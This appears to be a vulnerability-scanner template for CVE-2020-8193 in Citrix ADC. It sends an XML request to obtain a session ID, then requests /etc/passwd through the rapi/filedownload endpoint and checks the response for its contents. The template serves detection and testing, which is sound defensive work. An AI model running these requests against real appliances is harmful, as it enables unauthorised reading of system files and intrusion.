id: cve-2020-8193
info:
  name: Citrix ADC LFI - CVE-2020-8193
  risk: High
params:
- root: '{{.BaseURL}}'
- user: e4LZnjB9
- pass: kRcEnFy6
- file: '%2Fetc%2Fpasswd'
reference:
- links:
  - https://dmaasland.github.io/posts/citrix.html
  - https://support.citrix.com/article/CTX276688
  - https://www.cvebase.com/cve/2020/8193
requests:
- body: '<appfwprofile><login></login></appfwprofile>

    '
  conclusions:
  - RegexSelect("resHeaders", "SESSID=(?P<sess>([a-zA-Z0-9]+));")
  detections:
  - StatusCode() == 406 && StringSearch("resHeaders", "SESSID=")
  headers:
  - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  - Accept: application/xml
  - Accept-Language: en-US,en;q=0.5
  - Content-Type: application/xml
  - X-NITRO-USER: '{{.user}}'
  - X-NITRO-PASS: '{{.pass}}'
  method: POST
  redirect: false
  url: '{{.root}}//pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1'
- body: '<clipermission></clipermission>

    '
  conditions:
  - ValueOf("sess") !== ""
  detections:
  - StringSearch("body", "root:") && StringSearch("body", "bin/bash")
  headers:
  - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  - Accept: application/xml
  - Accept-Language: en-US,en;q=0.5
  - Content-Type: application/xml
  - rand_key: 1968033329.159428
  - Accept: '*/*'
  - X-NITRO-USER: '{{.user}}'
  - X-NITRO-PASS: '{{.pass}}'
  - Cookie: SESSID=[[.sess]]; is_cisco_platform=0; startupapp=neo
  method: POST
  redirect: false
  url: '{{.root}}//rapi/filedownload?filter=path:{{.file}}'
single: true
